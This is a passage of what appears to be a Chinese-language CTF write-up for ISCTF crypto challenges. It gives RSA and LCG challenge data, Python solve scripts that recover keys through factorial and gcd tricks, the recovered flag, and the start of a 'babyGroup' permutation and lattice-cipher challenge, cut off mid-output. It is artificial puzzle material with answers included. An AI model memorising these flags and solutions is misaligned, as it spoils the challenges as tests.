class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">n=<span class="number">11947241219140615237486309604628973391930339499486798714294498785973885463922548820705069266901903036359254530976927762175262118185159625298369758973935607721381080656199430417818042316007700805008489750740972102287526203064312544340176751751266738219862839022892152635044837041435349904947659346174437695051460882295109851494351994498403791853684239883961766735230202016890875913906900424655711952381425165331389205409282026144667620577946333963601349932905443037145145394667138672752796990411249984169798953060016353748467221154507518574580014882822860853751863757579945329482337792853278715658322366578632817369803</span></span><br><span class="line">leak=<span class="number">4825516411405566882589539973300777582630401687252523937619475044718073214792109569356301252345907914527064817796240727881691399437316660502564323688151311441558823720142071322647007043253626474853010585775710666373651910201889816367922377400970334479040370865879692204764210349607801862666059991789964453439198722962928173197103040385999540054988070333338229570681105393323319767364566644771731595597298210924296456293443125736685469259629163687986114207231233692023613120260155832741199446052855856512791809968963821161765216500389495853488545132008219841635172896843241988125093920217328861507191614658581776695350233593334984646128341640512614300048002219790302478025661133721688232990437685571940604588227022076092857294647830142309441330515812342199940466483115991318018705011472671758063610572930560763516803732693572940939851140384123593105367117155740563057395940645038058194280259524467405820813428765139386968927021061208348111646257434870000866555555283176852834141906387086839051793789126474095527358879630274092172435022326207193319806666865704778907868548658370890623182731938070419969709739233504224100413506514936517272134494776127809327563935813198793891897000404156963455000732616317276241867836699641699825594195079194154957636030485909612033254350828892222046169586844737908349421869385194421981553067305581842171364022745759111602699744161574724372962242132415149146766136601016174658042678857388889036814591399168640678928083442174651493660991088328784105160030857387096251561933704301600695757426945716557961698202485226605485682131045560193822624290720243852434254301324766198129736640005205530445739302632191151740246117208267182630330046600955724262084795763080838384593939971523865769318326101179866187596006185138294477350533316908592086441208575935282494961976691089358976722199557082176285926812134290542838960814502829473372780200310674359645482281037654052483716329497333729594792122297988611883754886634452292313599416610842690057657285337854049766320641249317238780428383587602425132767334811708075065922641191109650660427678019567095309270443930385437292172296652003394183918270707887845018685247162812541929998945735270109736669595830167257239265204520272132384023622231518288514767919183916561550558812478144292894132331163501566746036390319663066054892756826660841952717280005731719082266616429646501565960817772663658546555336959754321712751857740551378987853931613973604348308746819562341219749677392565068390386908064199536445684309718116754288299091975226013592388160308117145043236992250577771659408413506586402897189336742792418163003231783947003853396754144599319566763313339145462208172531322682800226151072022731913191728047323245146556315571396082728252085753230639541374982105041248659074695696205654079837224195868428271353983820725017250413714060967825638577327604252122887136259380946072629481202720339169708229866846597577227829317443910036825722430374711816074735238082313198164126791797947010044130222158124667234003098164746100341636238823175289796896896408971518797835906067939914494546110471749352544064300485882179448030898818405400902242119590645639910708635188342567159795613212660990908765619684401061336405049960091659288716162966504703741105477420409053115823924764680153604215949521605456710353305498258615912458036292507652321420277318757146737030628878096962452278346772976364597137682209395761868224382621093921689415088745975049380393255899867417274843474628482169247388041616142896804170033688742622605192409970919836724035274730923747265191248135577704760607590</span></span><br><span class="line">c = <span class="number">4058526944014006069084945174812818814825704864122299028618329411106188952604728150732223145114766938864644072527523082946069975859381918224872075058517683896020489424720005770218969436595364473179601299857281520204212872074837132357469599147175121200219338329188718982224238281009625352190581095607599976922610436817213692622671732783554216636941121695116377777616027462234472833366922829073660312229117800995468022619934881890343086653577149166193139948443894324239522101581089953817527886638425552917578146958961373353776642091545344162923084513872918786615317499139918810812014781753970806739855831453833956364967</span></span><br><span class="line"></span><br><span class="line">step2:</span><br><span class="line">n=<span class="number">138222025039224144545251830624229986468723531196582463907557734108529994926504669875900898789473948111199016914847829105939167293515822413866727879262875702026534563930475309506834431656926222982363543666448736091756871792887144283877167509418070979449484508499296324616988840431116233637168977730122017878289</span></span><br><span class="line">leak1=<span class="number">23535059927033628406212169278224758389583882623183004031205822980722154537430761635153622180505243837027568034322858038302626132200979370182327110682738910</span></span><br><span class="line">leak2 = [<span class="number">362437850887271063413256292444148642949623196635276044583204094265607936120337004605360832421011</span>, <span class="number">1932915843524327487337992118762711929552569713433223514001673251237692307587356544615955431611435994003602897830069566867051943572065473955405337889221398</span>, <span class="number">11222178024143398739150445814520244630341642052876364179793404105841311693968292227072031763726153574031884490677131749512430325919668649359617953965112844</span>, <span class="number">5408933876805830533113961512210040977462510675785228477646978801328722923647434079128879371684477664804744431834418916837956820965870203842552250165916773</span>, <span class="number">1447143741705069323823257922715038721270982554690635708441585728089036094805730054505696492295730683300002193478561819037345041940787115528445592303142510</span>, <span class="number">3707657531268843465369646969917923274507341341483950204025637357600814449263032574496424566705812439915548150679438579110456264431525526309588664326456861</span>, <span class="number">9263925820149827740182684692442727161206242182976684575667062235695526783971703826794731732152445051579616121306722939129265340347908823003172137299057843</span>, <span class="number">207494591333501391015462321304802957885928775185602834554977737560856036337667840127810136802887548047878444936730742505483927963807357904024967768148122</span>, <span class="number">7052936859446617933917872361389151092893299250603966165472023802877016733939957851026719428770748111897050866474067880613419756475700748999497496482278608</span>, <span class="number">1169538791889404037461397919075674424569430764451305755000680272926397357803359328850780774937432248011264334398346178303234064891680342161511829008635621</span>]</span><br><span class="line">final = [<span class="number">2268617516274900905319941795987877533673889507146326516564545408684476960310333170888941124460992562245780101836116975666368936099249664924148379487909122</span>, <span class="number">1445275952377746701088629016221431744592935398639655895336779954310077866709012082302847692239730041591520169244063854849129773530127510048494782550102381</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure><p>其实题目出的挺好的<del>傻逼的我赛时没做出来</del><br>两部分<br>PART1:<br>给了leak的一个表达式 这里要注意到 k! 非常的大<br>所以 x &#x3D; (leak-k)&#x2F;&#x2F;k! ≈ (ed-1)xgetprime(256)<br>然后我们通过 gcd(leak-k,x) &#x3D;&gt; getprime(256)<br>进而可以得到 ed-1 &#x3D;&gt; k×phi<br>这里得到ed-1要精确恢复</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">800</span>,<span class="number">1500</span>):</span><br><span class="line">    fact = factorial(k)</span><br><span class="line">    ed_1_prime256 = (leak-k)//fact</span><br><span class="line">    prime256 = <span class="built_in">int</span>(gcd(ed_1_prime256,leak-k))</span><br><span class="line">    <span class="keyword">if</span> prime256.bit_length()&gt;=<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;k= <span class="subst">&#123;k&#125;</span>\nprime256= <span class="subst">&#123;prime256&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>得到了kphi其实直接求e相对kphi的逆元作为d就能解RSA了(<del>学群论后基础数论忘了好多</del>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">k= <span class="number">1039</span></span><br><span class="line">prime256= <span class="number">108265111455950860152587704451025053167231031155722144225275801978438974863031</span></span><br><span class="line">f = factorial(k)</span><br><span class="line">e_2_prime256 = (leak-k)%f</span><br><span class="line">ed_1 = (leak-k-e_2_prime256)//(f*prime256)</span><br><span class="line">kphi = ed_1</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">e = <span class="built_in">int</span>(e)</span><br><span class="line">kphi = <span class="built_in">int</span>(kphi)</span><br><span class="line">d = modinv(e,kphi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment"># b&#x27;ISCTF&#123;yOu_kn0W_RSAgcd_and_g0Od_at&#x27;</span></span><br></pre></td></tr></table></figure><p>PART2:<br>注意到这个key的生成方式 可以发现符合卡迈克尔数的特性 查表 or 爆破都行<br>给的leak1其实就是给的p+q solve解一下即可<br>然后就是LCG恢复a,b 这里注意！ p,q换一换试一试。。。 我一直以第一个解出的p 结果一直LCG恢复不对 后面一看 题目没规定顺序…<del>难绷</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">p,q = q,p</span><br><span class="line">a = (leak2[-<span class="number">1</span>]-leak2[-<span class="number">2</span>])*modinv(leak2[-<span class="number">2</span>]-leak2[-<span class="number">3</span>],p)%p</span><br><span class="line">b = (leak2[-<span class="number">1</span>]-a*leak2[-<span class="number">2</span>])%p</span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line">seed = a*leak2[-<span class="number">1</span>]+b</span><br><span class="line">seed %= p</span><br><span class="line">base = seed^key</span><br><span class="line">c=base*(final[<span class="number">1</span>]+final[<span class="number">2</span>]*base)+final[<span class="number">0</span>]</span><br><span class="line">d = modinv(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;_LCG_also_like_Carmichael_number&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flag: ISCTF{yOu_kn0W_RSAgcd_and_g0Od_at_LCG_also_like_Carmichael_number}</p><h2 id="babyGroup"><a href="#babyGroup" class="headerlink" title="babyGroup"></a>babyGroup</h2><p>Per.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,sqrt,gcd</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">P</span>:</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">int</span>:</span><br><span class="line">self.size = data</span><br><span class="line">self._<span class="built_in">list</span> = [i+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.size)]</span><br><span class="line">self._initialize()</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">type</span>(data) <span class="keyword">is</span> <span class="built_in">list</span>:</span><br><span class="line">self._<span class="built_in">list</span> = data</span><br><span class="line">self.size = <span class="built_in">len</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, other</span>):</span><br><span class="line"><span class="keyword">return</span> P(self._iterList(self.getList(),other.getList()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">str</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">len</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__pow__</span>(<span class="params">self, other</span>):</span><br><span class="line">tempList = self._<span class="built_in">list</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,other):</span><br><span class="line">tempList = self._iterList(tempList, tempList)</span><br><span class="line"><span class="keyword">return</span> P(tempList)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">str</span>(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getList</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> self._<span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_initialize</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">random.shuffle(self._<span class="built_in">list</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_iterList</span>(<span class="params">self, List1,List2</span>):</span><br><span class="line">new_list = []</span><br><span class="line"><span class="keyword">for</span> elem <span class="keyword">in</span> List1:</span><br><span class="line">new_list.append(List2[elem - <span class="number">1</span>])</span><br><span class="line"><span class="keyword">return</span> new_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span>():</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">self.q = random.getrandbits(<span class="number">2048</span>)</span><br><span class="line">self.f = random.randint(<span class="number">1</span>, sqrt(self.q // <span class="number">2</span>))</span><br><span class="line">self.g = random.randint(sqrt(self.q // <span class="number">4</span>), sqrt(self.q // <span class="number">2</span>))</span><br><span class="line"><span class="keyword">if</span> gcd(self.f, self.q * self.g) == <span class="number">1</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">self.h = invert(self.f, self.q) * self.g % self.q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPublicKey</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">int</span>(self.q), <span class="built_in">int</span>(self.h))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">self, m</span>):</span><br><span class="line"><span class="keyword">assert</span> m &lt; sqrt(self.q//<span class="number">4</span>)</span><br><span class="line">r = random.randint(<span class="number">1</span>, sqrt(self.q // <span class="number">2</span>))</span><br><span class="line">e = (r * self.h + m) % self.q</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">self, e</span>):</span><br><span class="line">a = self.f * e % self.q</span><br><span class="line">b = invert(self.f, self.g) * a % self.g</span><br><span class="line"><span class="keyword">return</span> b</span><br></pre></td></tr></table></figure><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Per <span class="keyword">import</span> P,Block</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"></span><br><span class="line">mask = P(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mask**<span class="number">2</span>)</span><br><span class="line">mask_hash = hashlib.sha512(<span class="built_in">str</span>(mask).encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the mask hash is:&quot;</span> + mask_hash)</span><br><span class="line"></span><br><span class="line">mul = P(<span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;mul=&#125;</span>&quot;</span>)</span><br><span class="line">temp = hashlib.sha512(<span class="built_in">str</span>(mask * mul).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">msg = s2n(flag) ^ <span class="built_in">int</span>(temp,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">worker = Block()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;pubkey(q,h):<span class="subst">&#123;worker.getPublicKey()&#125;</span>&quot;</span>)</span><br><span class="line">c = worker.enc(msg)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c=&#125;</span>&quot;</span>)</span><br><span class="line">dec = worker.dec(c)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>output</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">82</span>, <span class="number">237</span>, <span class="number">32</span>, <span class="number">83</span>, <span class="number">30</span>, <span class="number">200</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">4</span>, <span class="number">147</span>, <span class="number">171</span>, <span class="number">152</span>, <span class="number">193</span>, <span class="number">19</span>, <span class="number">170</span>, <span class="number">136</span>, <span class="number">186</span>, <span class="number">8</span>, <span class="number">124</span>, <span class="number">159</span>, <span class="number">225</span>, <span class="number">6</span>, <span class="number">180</span>, <span class="number">125</span>, <span class="number">74</span>, <span class="number">14</span>, <span class="number">255</span>, <span class="number">60</span>, <span class="number">187</span>, <span class="number">132</span>, <span class="number">222</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">79</span>, <span class="number">57</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">27</span>, <span class="number">72</span>, <span class="number">197</span>, <span class="number">201</span>, <span class="number">191</span>, <span class="number">75</span>, <span class="number">38</span>, <span class="number">135</span>, <span class="number">177</span>, <span class="number">165</span>, <span class="number">149</span>, <span class="number">17</span>, <span class="number">172</span>, <span class="number">173</span>, <span class="number">59</span>, <span class="number">210</span>, <span class="number">108</span>, <span class="number">31</span>, <span class="number">142</span>, <span class="number">163</span>, <span class="number">227</span>, <span class="number">178</span>, <span class="number">226</span>, <span class="number">73</span>, <span class="number">256</span>, <span class="number">190</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">238</span>, <span class="number">129</span>, <span class="number">157</span>, <span class="number">219</span>, <span class="number">131</span>, <span class="number">67</span>, <span class="number">28</span>, <span class="number">68</span>, <span class="number">236</span>, <span class="number">168</span>, <span class="number">209</span>, <span class="number">245</span>, <span class="number">93</span>, <span class="number">61</span>, <span class="number">122</span>, <span class="number">208</span>, <span class="number">137</span>, <span class="number">49</span>, <span class="number">94</span>, <span class="number">111</span>, <span class="number">18</span>, <span class="number">161</span>, <span class="number">106</span>, <span class="number">54</span>, <span class="number">175</span>, <span class="number">70</span>, <span class="number">16</span>, <span class="number">110</span>, <span class="number">5</span>, <span class="number">218</span>, <span class="number">81</span>, <span class="number">233</span>, <span class="number">45</span>, <span class="number">91</span>, <span class="number">188</span>, <span class="number">151</span>, <span class="number">104</span>, <span class="number">148</span>, <span class="number">184</span>, <span class="number">228</span>, <span class="number">248</span>, <span class="number">150</span>, <span class="number">176</span>, <span class="number">167</span>, <span class="number">35</span>, <span class="number">130</span>, <span class="number">242</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">42</span>, <span class="number">169</span>, <span class="number">232</span>, <span class="number">102</span>, <span class="number">50</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">205</span>, <span class="number">9</span>, <span class="number">235</span>, <span class="number">97</span>, <span class="number">84</span>, <span class="number">246</span>, <span class="number">36</span>, <span class="number">76</span>, <span class="number">240</span>, <span class="number">52</span>, <span class="number">144</span>, <span class="number">98</span>, <span class="number">86</span>, <span class="number">99</span>, <span class="number">21</span>, <span class="number">64</span>, <span class="number">217</span>, <span class="number">15</span>, <span class="number">202</span>, <span class="number">206</span>, <span class="number">55</span>, <span class="number">244</span>, <span class="number">65</span>, <span class="number">23</span>, <span class="number">53</span>, <span class="number">250</span>, <span class="number">78</span>, <span class="number">22</span>, <span class="number">215</span>, <span class="number">25</span>, <span class="number">66</span>, <span class="number">143</span>, <span class="number">107</span>, <span class="number">195</span>, <span class="number">80</span>, <span class="number">196</span>, <span class="number">254</span>, <span class="number">174</span>, <span class="number">33</span>, <span class="number">162</span>, <span class="number">252</span>, <span class="number">141</span>, <span class="number">153</span>, <span class="number">43</span>, <span class="number">185</span>, <span class="number">211</span>, <span class="number">220</span>, <span class="number">115</span>, <span class="number">127</span>, <span class="number">216</span>, <span class="number">251</span>, <span class="number">139</span>, <span class="number">95</span>, <span class="number">146</span>, <span class="number">48</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">199</span>, <span class="number">13</span>, <span class="number">160</span>, <span class="number">90</span>, <span class="number">223</span>, <span class="number">123</span>, <span class="number">181</span>, <span class="number">120</span>, <span class="number">164</span>, <span class="number">118</span>, <span class="number">112</span>, <span class="number">128</span>, <span class="number">192</span>, <span class="number">249</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">207</span>, <span class="number">71</span>, <span class="number">182</span>, <span class="number">145</span>, <span class="number">62</span>, <span class="number">3</span>, <span class="number">92</span>, <span class="number">183</span>, <span class="number">194</span>, <span class="number">100</span>, <span class="number">24</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="number">117</span>, <span class="number">234</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">140</span>, <span class="number">166</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">189</span>, <span class="number">63</span>, <span class="number">46</span>, <span class="number">58</span>, <span class="number">231</span>, <span class="number">247</span>, <span class="number">47</span>, <span class="number">154</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">40</span>, <span class="number">26</span>, <span class="number">243</span>, <span class="number">253</span>, <span class="number">41</span>, <span class="number">51</span>, <span class="number">105</span>, <span class="number">155</span>, <span class="number">138</span>, <span class="number">1</span>, <span class="number">212</span>, <span class="number">20</span>, <span class="number">203</span>, <span class="number">213</span>, <span class="number">198</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">109</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">221</span>, <span class="number">113</span>, <span class="number">96</span>, <span class="number">204</span>, <span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">the mask <span class="built_in">hash</span> <span class="keyword">is</span>:91881f508f08fbafec1a6879fc3a1f215135c94c78f03fae8534d54dc05bd4a122a4e4508d32b9e02be08fbbb42a9e3335fc433c20e2da2e012d11b7324f6952</span><br><span class="line"></span><br><span class="line">mul=[<span class="number">114</span>, <span class="number">189</span>, <span class="number">92</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">161</span>, <span class="number">202</span>, <span class="number">250</span>, <span class="number">131</span>, <span class="number">9</span>, <span class="number">111</span>, <span class="number">226</span>, <span class="number">223</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">99</span>, <span class="number">208</span>, <span class="number">195</span>, <span class="number">216</span>, <span class="number">141</span>, <span class="number">116</span>, <span class="number">167</span>, <span class="number">34</span>, <span class="number">5</span>, <span class="number">129</span>, <span class="number">15</span>, <span class="number">158</span>, <span class="number">178</span>, <span class="number">197</span>, <span class="number">4</span>, <span class="number">187</span>, <span class="number">27</span>, <span class="number">200</span>, <span class="number">144</span>, <span class="number">76</span>, <span class="number">74</span>, <span class="number">154</span>, <span class="number">86</span>, <span class="number">249</span>, <span class="number">93</span>, <span class="number">112</span>, <span class="number">46</span>, <span class="number">104</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">40</span>, <span class="number">225</span>, <span class="number">38</span>, <span class="number">98</span>, <span class="number">186</span>, <span class="number">169</span>, <span class="number">64</span>, <span class="number">118</span>, <span class="number">33</span>, <span class="number">88</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">183</span>, <span class="number">43</span>, <span class="number">201</span>, <span class="number">198</span>, <span class="number">242</span>, <span class="number">135</span>, <span class="number">110</span>, <span class="number">218</span>, <span class="number">244</span>, <span class="number">120</span>, <span class="number">83</span>, <span class="number">212</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">148</span>, <span class="number">142</span>, <span class="number">11</span>, <span class="number">45</span>, <span class="number">232</span>, <span class="number">107</span>, <span class="number">18</span>, <span class="number">170</span>, <span class="number">60</span>, <span class="number">130</span>, <span class="number">247</span>, <span class="number">67</span>, <span class="number">65</span>, <span class="number">211</span>, <span class="number">182</span>, <span class="number">213</span>, <span class="number">134</span>, <span class="number">254</span>, <span class="number">70</span>, <span class="number">191</span>, <span class="number">210</span>, <span class="number">176</span>, <span class="number">145</span>, <span class="number">217</span>, <span class="number">82</span>, <span class="number">229</span>, <span class="number">125</span>, <span class="number">193</span>, <span class="number">155</span>, <span class="number">41</span>, <span class="number">113</span>, <span class="number">103</span>, <span class="number">49</span>, <span class="number">231</span>, <span class="number">133</span>, <span class="number">75</span>, <span class="number">109</span>, <span class="number">238</span>, <span class="number">126</span>, <span class="number">245</span>, <span class="number">163</span>, <span class="number">233</span>, <span class="number">227</span>, <span class="number">181</span>, <span class="number">51</span>, <span class="number">12</span>, <span class="number">143</span>, <span class="number">234</span>, <span class="number">239</span>, <span class="number">59</span>, <span class="number">240</span>, <span class="number">209</span>, <span class="number">42</span>, <span class="number">205</span>, <span class="number">230</span>, <span class="number">253</span>, <span class="number">203</span>, <span class="number">219</span>, <span class="number">23</span>, <span class="number">136</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">102</span>, <span class="number">94</span>, <span class="number">85</span>, <span class="number">62</span>, <span class="number">172</span>, <span class="number">236</span>, <span class="number">124</span>, <span class="number">100</span>, <span class="number">256</span>, <span class="number">196</span>, <span class="number">50</span>, <span class="number">101</span>, <span class="number">206</span>, <span class="number">150</span>, <span class="number">89</span>, <span class="number">29</span>, <span class="number">61</span>, <span class="number">69</span>, <span class="number">246</span>, <span class="number">237</span>, <span class="number">16</span>, <span class="number">37</span>, <span class="number">184</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">22</span>, <span class="number">36</span>, <span class="number">10</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">190</span>, <span class="number">17</span>, <span class="number">55</span>, <span class="number">115</span>, <span class="number">251</span>, <span class="number">77</span>, <span class="number">214</span>, <span class="number">122</span>, <span class="number">1</span>, <span class="number">255</span>, <span class="number">151</span>, <span class="number">157</span>, <span class="number">241</span>, <span class="number">224</span>, <span class="number">3</span>, <span class="number">44</span>, <span class="number">48</span>, <span class="number">175</span>, <span class="number">194</span>, <span class="number">138</span>, <span class="number">179</span>, <span class="number">159</span>, <span class="number">160</span>, <span class="number">53</span>, <span class="number">80</span>, <span class="number">73</span>, <span class="number">8</span>, <span class="number">35</span>, <span class="number">156</span>, <span class="number">117</span>, <span class="number">58</span>, <span class="number">140</span>, <span class="number">221</span>, <span class="number">180</span>, <span class="number">72</span>, <span class="number">123</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">228</span>, <span class="number">97</span>, <span class="number">71</span>, <span class="number">204</span>, <span class="number">39</span>, <span class="number">149</span>, <span class="number">2</span>, <span class="number">19</span>, <span class="number">173</span>, <span class="number">139</span>, <span class="number">146</span>, <span class="number">54</span>, <span class="number">96</span>, <span class="number">220</span>, <span class="number">79</span>, <span class="number">66</span>, <span class="number">57</span>, <span class="number">127</span>, <span class="number">243</span>, <span class="number">188</span>, <span class="number">165</span>, <span class="number">47</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">7</span>, <span class="number">199</span>, <span class="number">30</span>, <span 